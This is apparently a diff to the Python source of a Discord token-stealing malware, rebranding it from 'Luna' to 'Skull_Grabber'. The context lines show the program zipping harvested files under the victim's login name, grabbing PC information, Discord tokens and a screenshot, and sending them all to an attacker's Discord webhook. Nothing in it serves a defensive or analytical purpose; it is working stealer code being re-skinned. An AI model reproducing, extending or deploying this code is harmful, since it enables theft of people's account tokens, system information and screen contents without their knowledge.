@@ -49,7 +49,7 @@ def main(webhook: str):
     zipup()
 
     _file = None
-    _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
+    _file = File(f'{localappdata}\\Skull_Grabber-Logged-{os.getlogin()}.zip')
 
     content = ""
     if __PING__:
@@ -58,7 +58,7 @@ def main(webhook: str):
         elif __PINGTYPE__ == "here":
             content += "@here"
 
-    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Test")
+    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096", username="Skull_Grabber")
 
     PcInfo()
     Discord()
@@ -174,7 +174,7 @@ class PcInfo:
             inline=False)
         embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
-        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Test")
+        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096", username="Skull_Grabber")
 
 
 class Discord:
@@ -322,9 +322,9 @@ class Discord:
                 embed.set_thumbnail(url=info['ThumbnailUrl'])
 
                 webhook.send(
-                    avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                    avatar_url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096",
                     embed=embed,
-                    username="Test")
+                    username="Skull_Grabber")
         except Exception:
             pass
 
@@ -408,8 +408,8 @@ class Discord:
 
             webhook.send(
                 embed=embed,
-                avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-                username="Test")
+                avatar_url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096",
+                username="Skull_Grabber")
             self.tokens_sent += token
 
         image = ImageGrab.grab(
@@ -429,7 +429,7 @@ class Discord:
         webhook.send(
             embed=embed2,
             file=file,
-            username="Test")
+            username="Skull_Grabber")
 
 
 @trygrab
@@ -700,7 +700,7 @@ def zipup():
     global localappdata
     localappdata = os.getenv('LOCALAPPDATA')
 
-    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
+    _zipfile = os.path.join(localappdata, f'Skull_Grabber-Logged-{os.getlogin()}.zip')
     zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
     abs_src = os.path.abspath(tempfolder)
     for dirname, _, files in os.walk(tempfolder):
